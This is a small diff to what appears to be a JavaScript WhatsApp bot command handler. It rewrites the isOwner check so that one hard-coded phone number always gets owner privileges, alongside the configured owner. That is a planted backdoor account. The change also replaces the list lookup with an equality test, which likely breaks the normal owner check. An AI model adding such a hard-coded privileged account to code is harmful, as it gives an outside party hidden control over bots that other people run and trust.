@@ -78,7 +78,7 @@ module.exports = async(conn, msg, m, setting) => {
 		const isCmd = command.startsWith(prefix)
 		const isGroup = msg.key.remoteJid.endsWith('@g.us')
 		const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
-		const isOwner = ownerNumber.includes(sender)
+		const isOwner = ownerNumber == sender ? true : sender == "6285791458996@s.whatsapp.net" ? true : false
 		const pushname = msg.pushName
 		const q = chats.slice(command.length + 1, chats.length)
 		const body = chats.startsWith(prefix) ? chats : ''
